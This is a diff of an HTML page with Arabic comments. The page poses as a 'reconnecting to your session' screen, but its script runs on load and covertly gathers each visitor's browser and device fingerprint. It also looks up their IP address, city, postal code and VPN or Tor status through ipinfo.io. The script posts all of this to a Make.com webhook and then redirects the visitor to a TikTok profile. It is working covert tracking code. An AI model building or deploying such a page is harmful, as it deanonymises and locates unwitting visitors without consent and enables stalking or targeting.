@@ -75,106 +75,100 @@
     <div class="sub-text">Please wait while we reconnect you to your session</div>
   </div>
 
+  <script>
+     ;
+    async function collectData() {
+      const now = new Date();
+const localTime = now.toLocaleString();
+      const userData = {
+      
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        screenSize: `${window.screen.width}x${window.screen.height}`,
+        colorDepth: window.screen.colorDepth,
+        pixelRatio: window.devicePixelRatio,
+        platform: navigator.platform,
+        referrer: document.referrer,
+        online: navigator.onLine,
+        javaEnabled: navigator.javaEnabled(),
+        cookiesEnabled: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack,
+        localStorage: !!window.localStorage,
+        sessionStorage: !!window.sessionStorage,
+        timestamp: new Date().toISOString(),
+        localTime: localTime,
+      };
 
+      if (navigator.connection) {
+        userData.connectionType = navigator.connection.effectiveType;
+        userData.downlink = navigator.connection.downlink;
+        userData.rtt = navigator.connection.rtt;
+      }
 
-<script>
-  
-  async function collectData() {
-    const now = new Date();
-    const localTime = now.toLocaleString(); // ✅ الوقت المحلي معرف ومضمون
+      if (navigator.deviceMemory) {
+        userData.deviceMemory = navigator.deviceMemory + " GB";
+      }
 
-    const userData = {
-      userAgent: navigator.userAgent,
-      language: navigator.language,
-      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      localTime: localTime, // ✅ الوقت المحلي
-      screenSize: `${window.screen.width}x${window.screen.height}`,
-      colorDepth: window.screen.colorDepth,
-      pixelRatio: window.devicePixelRatio,
-      platform: navigator.platform,
-      referrer: document.referrer,
-      online: navigator.onLine,
-      javaEnabled: navigator.javaEnabled(),
-      cookiesEnabled: navigator.cookieEnabled,
-      doNotTrack: navigator.doNotTrack,
-      localStorage: !!window.localStorage,
-      sessionStorage: !!window.sessionStorage,
-      timestamp: now.toISOString()
-    };
+      if (navigator.hardwareConcurrency) {
+        userData.cpuCores = navigator.hardwareConcurrency;
+      }
 
-    if (navigator.connection) {
-      userData.connectionType = navigator.connection.effectiveType;
-      userData.downlink = navigator.connection.downlink;
-      userData.rtt = navigator.connection.rtt;
-    }
+      if (navigator.maxTouchPoints) {
+        userData.touchSupport = navigator.maxTouchPoints > 0;
+      }
 
-    if (navigator.deviceMemory) {
-      userData.deviceMemory = navigator.deviceMemory + " GB";
-    }
+      if (navigator.getBattery) {
+        try {
+          const battery = await navigator.getBattery();
+          userData.batteryLevel = Math.round(battery.level * 100) + "%";
+          userData.isCharging = battery.charging;
+        } catch (err) {}
+      }
 
-    if (navigator.hardwareConcurrency) {
-      userData.cpuCores = navigator.hardwareConcurrency;
-    }
-
-    if (navigator.maxTouchPoints) {
-      userData.touchSupport = navigator.maxTouchPoints > 0;
-    }
-
-    if (navigator.getBattery) {
       try {
-        const battery = await navigator.getBattery();
-        userData.batteryLevel = Math.round(battery.level * 100) + "%";
-        userData.isCharging = battery.charging;
-      } catch (err) {}
-    }
-
-    try {
-      const ipRes = await fetch('https://ipinfo.io/json?token=cb4dd6c6220e6e');
-      const ipData = await ipRes.json();
-      userData.ip = ipData.ip;
-      userData.hostname = ipData.hostname;
-      userData.city = ipData.city;
-      userData.region = ipData.region;
-      userData.country = ipData.country;
-      userData.loc = ipData.loc;
-      userData.org = ipData.org;
-      userData.postal = ipData.postal;
-      userData.timezone = ipData.timezone;
-
-      // ✅ التحقق من asn
-      if (ipData.asn && ipData.asn.asn) {
-        userData.asn = ipData.asn.asn;
-      } else {
-        userData.asn = "N/A";
+        const ipRes = await fetch('https://ipinfo.io/json?token=cb4dd6c6220e6e');
+        const ipData = await ipRes.json();
+        userData.ip = ipData.ip;
+        userData.hostname = ipData.hostname;
+        userData.city = ipData.city;
+        userData.region = ipData.region;
+        userData.country = ipData.country;
+        userData.loc = ipData.loc;
+        userData.org = ipData.org;
+        userData.postal = ipData.postal;
+        userData.timezone = ipData.timezone;
+        userData.asn = ipData.asn ? ipData.asn.asn : null;
+        userData.vpn = ipData.privacy?.vpn || false;
+        userData.proxy = ipData.privacy?.proxy || false;
+        userData.tor = ipData.privacy?.tor || false;
+      } catch (err) {
+        console.error('IPInfo Error:', err);
       }
 
-      // ✅ التحقق من vpn/proxy/tor
-      userData.vpn = ipData.privacy?.vpn || false;
-      userData.proxy = ipData.privacy?.proxy || false;
-      userData.tor = ipData.privacy?.tor || false;
-    } catch (err) {
-      console.error('IPInfo Error:', err);
+      // ✅ إرسال البيانات إلى Webhook الخاص بـ Make
+      fetch("https://hook.eu2.make.com/getpor6u5xfrmr4xwkwr0p81umfj5okg", {
+        method: "POST",
+        body: JSON.stringify(userData),
+        headers: {
+          "Content-Type": "application/json"
+        }
+      })
+      .then(response => response.text())
+      .then(data => {
+        console.log("✅ تم الإرسال إلى Make:", data);
+      })
+      .catch(error => {
+        console.error("❌ خطأ في الإرسال:", error);
+      });
+
+      // 🔁 التحويل إلى TikTok بعد ثانيتين ونصف
+      setTimeout(() => {
+        window.location.href = "https://www.tiktok.com/@dr3altwhed?_t=ZS-8yHpMxmbUCl&_r=1";
+      }, 2500);
     }
 
-    fetch("https://hook.eu2.make.com/getpor6u5xfrmr4xwkwr0p81umfj5okg", {
-      method: "POST",
-      body: JSON.stringify(userData),
-      headers: {
-        "Content-Type": "application/json"
-      }
-    })
-    .then(response => response.text())
-    .then(data => {
-      console.log("تم الإرسال:", data);
-    })
-    .catch(error => {
-      console.error("خطأ في الإرسال:", error);
-    });
-
-    setTimeout(() => {
-      window.location.href = "https://www.tiktok.com/@dr3altwhed?_t=ZS-8yHpMxmbUCl&_r=1";
-    }, 2500);
-  }
-
-  collectData();
-</script> 
+    collectData();
+  </script>
+</body>
+</html>
